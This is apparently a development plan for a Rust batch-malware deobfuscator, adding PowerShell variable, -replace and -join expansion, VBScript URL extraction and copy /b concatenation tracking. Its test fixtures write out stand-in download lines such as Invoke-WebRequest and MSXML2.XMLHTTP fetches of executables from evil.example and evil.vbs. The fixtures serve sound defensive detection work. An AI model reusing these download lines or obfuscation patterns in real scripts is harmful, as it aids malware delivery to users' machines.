# batdeob Plan H — Deeper deobfuscation: PS variables, -replace/-join, VBS, copy/b multi-source

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Push past first-order URL extraction. Many corpus samples hide URLs behind PowerShell variable assignments, `-replace` chains, `-join` array literals, or in extracted VBScript payloads. Plan H plumbs each.

**Prereq:** Plans A–G landed. 217 tests, 100% corpus success. v6 corpus had 628 `Download` traits and 22 `RecursiveAnalysis` events.

---

## Task 1: PowerShell variable substitution

**Impact:** Big. Invoke-Obfuscation routinely does `$u='http://evil'; IWR $u` instead of inline URLs.

**Approach:** before running URL regexes in `ps1_scan`, do a single pass to collect `$name = 'literal'` assignments (and concat-of-literals: `$name = 'a' + 'b' + 'c'`), then substitute `$name` references with their resolved values.

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

- [ ] **Step 1: Add tests** to `lib.rs`:

```rust
#[cfg(test)]
mod ps1_var_substitution_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn ps_variable_resolves_to_url() {
        let inner = r#"$u = 'http://evil.example/x.exe'; Invoke-WebRequest -Uri $u -OutFile c.exe"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/x.exe")
        ));
        assert!(has, "no Download trait from $u var: {:?}", report.traits);
    }

    #[test]
    fn ps_variable_concat_assigned_resolves() {
        let inner = r#"$u = 'http://' + 'evil.example/' + 'y'; Invoke-WebRequest $u"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/y")
        ));
        assert!(has, "no Download from concat-assigned: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add `expand_ps_variables(text: &str) -> String`** in `ps1_scan.rs`. Call from `expand_obfuscation` BEFORE the URL regexes:

```rust
fn expand_obfuscation(text: &str) -> String {
    let mut out = text.to_string();
    out = expand_char_concat(&out);
    out = expand_string_concat(&out);
    out = expand_base64_literals(&out);
    out = expand_ps_variables(&out);  // NEW
    out
}

#[allow(clippy::expect_used)]
static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    // $name = 'literal'   (literal must be single-quoted; double-quoted has interpolation)
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#).expect("ps var assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    // $name (followed by non-name char)
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps var ref")
});

fn expand_ps_variables(text: &str) -> String {
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), caps.get(2)) {
            bindings.insert(n.as_str().to_string(), v.as_str().to_string());
        }
    }
    if bindings.is_empty() { return text.to_string(); }

    // Replace $name references with 'value' (quoted, so URL regexes still match)
    let mut out = text.to_string();
    let matches: Vec<(usize, usize, String)> = PS_VAR_REF_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            // Don't replace inside the assignment LHS itself — heuristic: skip refs
            // that are immediately followed by '=' (with optional whitespace).
            let after = &text[full.end()..];
            let after_trim = after.trim_start();
            if after_trim.starts_with('=') && !after_trim.starts_with("==") {
                return None;
            }
            bindings.get(name).map(|v| (full.start(), full.end(), format!("'{}'", v)))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ps1_scan.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "ps1_scan: track \$var = 'literal' assignments and substitute references"
```

---

## Task 2: PowerShell `-replace` and `-join`

**Impact:** `'hxxp://evil' -replace 'x','t'` → `'http://evil'`. `'h','t','t','p','s' -join ''` → `'https'`. Heavy Invoke-Obfuscation use.

**Approach:** add two more expanders in `ps1_scan`:
- `'literal' -replace 'old','new'` → `'literal-with-old-replaced'`
- `'a','b','c' -join 'sep'` → `'asepbsepc'` (separator can be empty)

**Files:**
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`

- [ ] **Step 1: Add tests**:

```rust
#[cfg(test)]
mod ps_replace_join_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn ps_replace_chain_resolves() {
        let inner = r#"Invoke-WebRequest -Uri ('hxxp://evil.example/x' -replace 'x','t')"#;
        // After -replace, all x→t. Note all three 'x' get replaced. Use a URL with
        // a non-x letter to verify just the right ones swap:
        let inner = r#"Invoke-WebRequest -Uri ('Xttp://evil.example/y' -replace 'X','h')"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("http://evil.example/y")
        ));
        assert!(has, "no Download after -replace: {:?}", report.traits);
    }

    #[test]
    fn ps_join_array_resolves() {
        let inner = r#"Invoke-WebRequest ('h','t','t','p','s',':','/','/','x','.','c','o','m' -join '')"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("https://x.com")
        ));
        assert!(has, "no Download after -join: {:?}", report.traits);
    }
}
```

- [ ] **Step 2: Add `expand_ps_replace` + `expand_ps_join`** to `ps1_scan.rs`:

```rust
#[allow(clippy::expect_used)]
static REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'\s*-replace\s*'([^'\\]*(?:\\.[^'\\]*)*)'\s*,\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#).expect("replace")
});

fn expand_ps_replace(text: &str) -> String {
    let mut out = text.to_string();
    // Run repeatedly so chained -replace ('a' -replace 'x','y' -replace 'z','w') works
    loop {
        let mut hit = false;
        let next: Vec<(usize, usize, String)> = REPLACE_RE.captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let haystack = caps.get(1)?.as_str();
                let needle = caps.get(2)?.as_str();
                let repl = caps.get(3)?.as_str();
                let new_str = haystack.replace(needle, repl);
                Some((full.start(), full.end(), format!("'{}'", new_str)))
            })
            .collect();
        if next.is_empty() { break; }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
            hit = true;
        }
        if !hit { break; }
    }
    out
}

#[allow(clippy::expect_used)]
static JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // (?:'a','b','c') -join 'sep'   — outer parens optional
    Regex::new(r#"\(?\s*((?:'[^'\\]*(?:\\.[^'\\]*)*'\s*,\s*)+'[^'\\]*(?:\\.[^'\\]*)*')\s*\)?\s*-join\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#).expect("join")
});

#[allow(clippy::expect_used)]
static JOIN_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'"#).expect("join part")
});

fn expand_ps_join(text: &str) -> String {
    let mut out = text.to_string();
    let matches: Vec<(usize, usize, String)> = JOIN_RE.captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let sep = caps.get(2)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE.captures_iter(parts_text)
                .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                .collect();
            if parts.is_empty() { return None; }
            Some((full.start(), full.end(), format!("'{}'", parts.join(sep))))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}
```

Wire into `expand_obfuscation` BEFORE `expand_ps_variables` (so vars assigned from `-replace`/`-join` results resolve too):

```rust
fn expand_obfuscation(text: &str) -> String {
    let mut out = text.to_string();
    out = expand_char_concat(&out);
    out = expand_string_concat(&out);
    out = expand_base64_literals(&out);
    out = expand_ps_join(&out);       // NEW
    out = expand_ps_replace(&out);    // NEW
    out = expand_ps_variables(&out);
    out
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/ps1_scan.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "ps1_scan: expand -replace and -join operator chains before URL extraction"
```

---

## Task 3: VBScript URL extraction (`vbs_scan`)

**Impact:** Symmetric to `ps1_scan`. `cscript`/`wscript` handlers populate `env.exec_vbs` and `env.exec_jscript`; we never scan them. Common VBS download patterns: `MSXML2.XMLHTTP`, `WinHTTP`, `ADODB.Stream.Write`.

**Files:**
- Create: `rust/crates/batdeob-core/src/vbs_scan.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs`
- Modify: `rust/crates/batdeob-core/src/env.rs` if `all_extracted_vbs`/`all_extracted_jscript` accumulators don't exist (they may; check)

- [ ] **Step 1: Add tests**:

```rust
#[cfg(test)]
mod vbs_url_extraction_tests {
    use crate::{analyze, Config};
    use crate::env::FsEntry;
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn vbs_xmlhttp_url_extracted() {
        let vbs = br#"Set http = CreateObject("MSXML2.XMLHTTP"): http.Open "GET", "http://evil.vbs/x.exe", False: http.Send"#;
        // Stage: set the vbs file in modified_filesystem, then cscript it
        let mut script = format!("(>drop.vbs echo {})\r\ncscript //nologo drop.vbs\r\n",
            String::from_utf8_lossy(vbs));
        // Replace ( and ) carefully — they're valid in the leading-redirect form
        script = script.replace("(>drop.vbs", ">drop.vbs");
        script = script.replace(")\r\n", "\r\n");
        let report = crate::analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.vbs/x.exe")
        ));
        assert!(has, "no Download from VBS XMLHTTP: {:?}", report.traits);
    }
}
```

This test is sketchy because building the VBS via echo redirection might lose characters (colons, parens, quotes). A simpler direct-API test:

```rust
    #[test]
    fn vbs_xmlhttp_url_extracted_direct() {
        use crate::env::{Config, Environment};
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://evil.vbs/x.exe", False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.vbs/x.exe")
        ));
        assert!(has, "no Download trait: {:?}", env.traits);
    }
```

The direct-API test is more reliable. Use that.

Note: `env.all_extracted_vbs` may not exist yet — check `env.rs`. Plan A only had `exec_vbs`/`exec_jscript` (transient queues). Plan A fixup added `all_extracted_cmd`/`all_extracted_ps1` accumulators. We need symmetric `all_extracted_vbs` / `all_extracted_jscript`.

- [ ] **Step 2: Add accumulator fields** if missing

In `env.rs`, find the output-accumulator group. If `all_extracted_vbs: Vec<Vec<u8>>` and `all_extracted_jscript: Vec<Vec<u8>>` aren't there, add them. Update `Default for Environment` and any code that pushes to `exec_vbs`/`exec_jscript` to also push to the cumulative lists (mirror the `cmd`/`ps1` pattern from Plan A fixup 3).

- [ ] **Step 3: Create `vbs_scan.rs`**:

```rust
//! VBScript payload post-processing: extract URLs from VBS payloads.
//! Common patterns: MSXML2.XMLHTTP, WinHTTP.WinHTTPRequest, Net.WebClient.

use crate::env::Environment;
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;

#[allow(clippy::expect_used)]
static XMLHTTP_OPEN_RE: Lazy<Regex> = Lazy::new(|| {
    // http.Open "GET", "url", False  /  http.Open "POST", "url", False
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*"([^"]+)""#).expect("xmlhttp")
});

#[allow(clippy::expect_used)]
static SAVETOFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.SaveToFile\s*\(?\s*"([^"]+)""#).expect("savetofile")
});

#[allow(clippy::expect_used)]
static URLDOWN_RE: Lazy<Regex> = Lazy::new(|| {
    // URLDownloadToFile
    Regex::new(r#"(?i)URLDownloadToFile[^"]*"([^"]+)""#).expect("urldown")
});

pub fn scan_vbs_payloads(env: &mut Environment) {
    let payloads: Vec<Vec<u8>> = env.all_extracted_vbs.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    for (idx, payload) in payloads.iter().enumerate() {
        let text = String::from_utf8_lossy(payload);
        let dst_hint: Option<String> = SAVETOFILE_RE.captures(&text)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));
        let regexes: &[&Lazy<Regex>] = &[&XMLHTTP_OPEN_RE, &URLDOWN_RE];
        for re in regexes {
            for caps in re.captures_iter(&text) {
                let Some(url_match) = caps.get(1) else { continue };
                let url = url_match.as_str().to_string();
                if !url.starts_with("http://") && !url.starts_with("https://") && !url.starts_with("ftp://") {
                    continue;
                }
                if !seen.insert((idx, url.clone())) { continue; }
                let snippet: String = text.chars().take(120).collect();
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst: dst_hint.clone(),
                });
            }
        }
    }
}
```

- [ ] **Step 4: Add `pub mod vbs_scan;`** and call after `ps1_scan` in `analyze()`:

```rust
    ps1_scan::scan_ps1_payloads(&mut env);
    vbs_scan::scan_vbs_payloads(&mut env);
    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
```

- [ ] **Step 5: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "Add vbs_scan: extract URLs from VBS payloads (XMLHTTP/URLDownloadToFile)"
```

---

## Task 4: `copy /b A + B + C dst` multi-source concat

**Impact:** Splitter droppers concatenate 3+ files into the final EXE. Current `h_copy` only tracks 2-arg form.

**Files:**
- Modify: `rust/crates/batdeob-core/src/handlers/copy.rs`

- [ ] **Step 1: Add test**:

```rust
#[cfg(test)]
mod copy_multi_source_tests {
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;

    #[test]
    fn copy_b_multi_source_concat_tracked() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert("a.bin".to_string(), FsEntry::Content { content: b"AAAA".to_vec(), append: false });
        env.modified_filesystem.insert("b.bin".to_string(), FsEntry::Content { content: b"BBBB".to_vec(), append: false });
        env.modified_filesystem.insert("c.bin".to_string(), FsEntry::Content { content: b"CCCC".to_vec(), append: false });
        interpret_line("copy /b a.bin + b.bin + c.bin out.exe", &mut env);
        // out.exe should be in fs with concatenated content
        let entry = env.modified_filesystem.get("out.exe").expect("out.exe");
        match entry {
            FsEntry::Content { content, .. } => {
                assert_eq!(content, b"AAAABBBBCCCC", "got: {:?}", content);
            }
            FsEntry::Copy { .. } => {
                // Acceptable fallback: at minimum track the destination
            }
            _ => panic!("unexpected entry: {:?}", entry),
        }
    }
}
```

- [ ] **Step 2: Update `h_copy`** in `handlers/copy.rs`

The current logic assumes exactly 2 positional args. Detect the `+` separator pattern in arg parsing — when args look like `A + B + C dst`, collect all sources before the last positional, treat the last as dst.

The token list (post strip-flags + strip-quotes) for `copy /b a.bin + b.bin + c.bin out.exe` is something like `["a.bin", "+", "b.bin", "+", "c.bin", "out.exe"]`. The `+` tokens are positional separators between sources. The last non-`+` token is the destination.

Rewrite the body of `h_copy`:

```rust
pub fn h_copy(raw: &str, env: &mut Environment) {
    let tokens: Vec<String> = split_words_local(raw);
    let general_opts = ["/v","/n","/l","/y","/-y","/z"];
    let file_opts = ["/a","/b","/d"];
    let mut args: Vec<String> = Vec::new();
    for t in tokens.iter().skip(1) {
        let lt = t.to_ascii_lowercase();
        if general_opts.contains(&lt.as_str()) || file_opts.contains(&lt.as_str()) {
            continue;
        }
        args.push(strip_quotes(t).to_string());
    }
    // Multi-source form: A + B + C dst
    if args.iter().any(|a| a == "+") {
        // Split on "+" — sources are non-"+" tokens except the last one
        let non_plus: Vec<String> = args.iter().filter(|a| a.as_str() != "+").cloned().collect();
        if non_plus.len() < 2 { return; }
        let (sources, dst_slice) = non_plus.split_at(non_plus.len() - 1);
        let dst = collapse_slashes(&dst_slice[0]);
        // Try to concatenate content from modified_filesystem
        let mut combined: Vec<u8> = Vec::new();
        let mut all_resolved = true;
        for src in sources {
            let key = src.to_ascii_lowercase();
            match env.modified_filesystem.get(&key) {
                Some(FsEntry::Content { content, .. }) | Some(FsEntry::Decoded { content, .. }) => {
                    combined.extend_from_slice(content);
                }
                _ => { all_resolved = false; }
            }
        }
        if all_resolved && !combined.is_empty() {
            env.modified_filesystem.insert(dst.to_ascii_lowercase(),
                FsEntry::Content { content: combined, append: false });
        } else {
            // Fallback: just record the dst with first source provenance
            env.modified_filesystem.insert(dst.to_ascii_lowercase(),
                FsEntry::Copy { src: sources.join("+") });
        }
        env.traits.push(Trait::CommandGrouping {
            cmd: raw.to_string(),
            normalized: format!("copy /b {} → {}", sources.join("+"), dst),
        });
        return;
    }
    // Single-source form (existing behavior)
    if args.len() != 2 { return; }
    let src = collapse_slashes(&args[0]);
    let dst = collapse_slashes(&args[1]);
    if src.to_ascii_lowercase().starts_with("c:\\windows\\system32")
        && !dst.to_ascii_lowercase().starts_with("c:\\windows\\system32")
    {
        env.traits.push(Trait::WindowsUtilManip { cmd: raw.to_string(), src: src.clone(), dst: dst.clone() });
    }
    env.modified_filesystem.insert(dst.to_ascii_lowercase(), FsEntry::Copy { src });
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/handlers/copy.rs rust/crates/batdeob-core/src/lib.rs
git commit -m "copy /b: handle multi-source A + B + C dst concatenation"
```

---

## Task 5: Corpus v7 + final delta

After Tasks 1-4 land, validate.

- [ ] **Step 1: Build + run**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3

if [ ! -f /tmp/corpus_run_v6.sh ]; then
    cat > /tmp/corpus_run_v6.sh <<'BASH'
#!/usr/bin/env bash
set -u
export PATH="$HOME/.cargo/bin:$PATH"
BIN=/home/coz/Downloads/batch_deobfuscator/rust/target/release/batdeob
OUT=/tmp/corpus_results_v6
mkdir -p "$OUT"
run_one() {
    local f="$1"
    local sha=$(printf '%s' "$f" | sha256sum | cut -c1-12)
    local out_json="$OUT/$sha.json"
    local err_log="$OUT/$sha.err"
    timeout 12 "$BIN" analyze "$f" --timeout 5 --max-iterations 65536 --max-child-scripts 64 --max-depth 12 --max-output-bytes 4194304 --max-output-line-bytes 65536 --max-traits-per-kind 100 > "$out_json" 2> "$err_log"
    printf '{"sha":"%s","file":%s,"rc":%d,"out_size":%d}\n' \
        "$sha" "$(printf '%s' "$f" | jq -R -s '.')" "$?" \
        "$(stat -c%s "$out_json" 2>/dev/null || echo 0)" >> "$OUT/index.jsonl"
}
export -f run_one
export BIN OUT
find /home/coz/cstorage/mbzdls -maxdepth 5 \( -iname '*.bat' -o -iname '*.cmd' \) -type f -print0 2>/dev/null | xargs -0 -n 1 -P 8 -I {} bash -c 'run_one "$@"' _ {}
BASH
fi
sed 's|corpus_results_v6|corpus_results_v7|g' /tmp/corpus_run_v6.sh > /tmp/corpus_run_v7.sh
chmod +x /tmp/corpus_run_v7.sh
mkdir -p /tmp/corpus_results_v7 && rm -rf /tmp/corpus_results_v7/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v7.sh > /tmp/corpus_run_v7.log 2>&1
wc -l /tmp/corpus_results_v7/index.jsonl
```

- [ ] **Step 2: Compare v6 vs v7**

Same Python diff script as prior corpus comparisons (load both index.jsonl files, compute summary stats, count traits per kind). Highlight:

- **Download trait delta** (target: 628 → 1000+)
- **RecursiveAnalysis** (still present, may grow)
- New traits from this plan: none — we're reusing `Download`

- [ ] **Step 3: Commit summary**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "Plan H complete: v7 corpus + deeper deobfuscation"
```

## Report

- v6 vs v7 deltas (esp. Download count)
- Total tests (target: 217 base + ~6 new = ~223)
- Any sample that newly emits a Download due to PS var substitution / -replace / -join / VBS

---

## Self-review

- **Spec coverage**: PS var subst (Invoke-Obfuscation), -replace/-join (more Invoke-Obfuscation), VBS scanning (symmetric to ps1), copy /b multi-source (splitter droppers).
- **Placeholders**: none.
- **Type consistency**: no new trait variants — Plan H reuses `Trait::Download` and `Trait::CommandGrouping`.
- **Risk**: `expand_ps_variables` could over-substitute if a `$var` reference appears inside another quoted string. The heuristic "skip refs followed by `=`" handles the LHS case. The single-quoted-only assignment regex avoids interpolation-string ambiguity. Acceptable.

**Plan H complete.** Execute via `superpowers:subagent-driven-development`.
